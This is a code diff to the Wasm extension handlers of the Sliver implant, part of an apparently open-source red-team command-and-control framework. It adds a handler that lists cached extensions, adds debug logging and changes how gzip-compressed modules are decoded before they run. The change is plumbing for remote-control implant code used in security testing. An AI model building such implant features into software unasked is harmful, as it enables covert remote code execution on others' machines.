@@ -19,25 +19,36 @@ package handlers
 */
 
 import (
+	"io"
 
 	// {{if .Config.Debug}}
-
-	"io"
 	"log"
-
 	// {{end}}
 
+	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/bishopfox/sliver/implant/sliver/extension"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/util/encoders"
 	"google.golang.org/protobuf/proto"
 )
 
 var wasmExtensionCache = map[string]*pb.RegisterWasmExtensionReq{}
 
 // *** RPC Handlers ***
+
+func listWasmExtensionsHandler(data []byte, resp RPCResponse) {
+	// {{if .Config.Debug}}
+	log.Printf("List Wasm extensions ...")
+	// {{end}}
+
+	names := []string{}
+	for name := range wasmExtensionCache {
+		names = append(names, name)
+	}
+	wasmExt, _ := proto.Marshal(&pb.ListWasmExtensions{Names: names, Response: &commonpb.Response{}})
+	resp(wasmExt, nil)
+}
 
 // registerWasmExtensionHandler - Load a Wasm extension
 func registerWasmExtensionHandler(data []byte, resp RPCResponse) {
@@ -50,9 +61,20 @@ func registerWasmExtensionHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
+	// {{if .Config.Debug}}
+	log.Printf("Registering Wasm extension: %s", wasmExtReq.Name)
+	// {{end}}
+
 	// Cache the Wasm extension in the map until we receive a
 	// MsgExecWasmExtensionReq message
 	wasmExtensionCache[wasmExtReq.Name] = wasmExtReq
+
+	// {{if .Config.Debug}}
+	log.Printf("*** Wasm extensions cache ***")
+	for name := range wasmExtensionCache {
+		log.Printf(" - %s", name)
+	}
+	// {{end}}
 
 	wasmExt, _ := proto.Marshal(&pb.RegisterWasmExtension{Response: &commonpb.Response{}})
 	resp(wasmExt, nil)
@@ -103,7 +125,14 @@ func execWasmExtensionHandler(envelope *pb.Envelope, connection *transports.Conn
 		return
 	}
 
-	wasmExtRuntime, err := extension.NewWasmExtension(extReq.Name, encoders.GunzipBuf(extReq.WasmGz), extReq.MemFS)
+	wasmBin, err := encoders.Gzip.Decode(extReq.WasmGz)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding Wasm extension: %v", err)
+		// {{end}}
+		return
+	}
+	wasmExtRuntime, err := extension.NewWasmExtension(extReq.Name, wasmBin, extReq.MemFS)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("error creating wasm extension: %v", err)
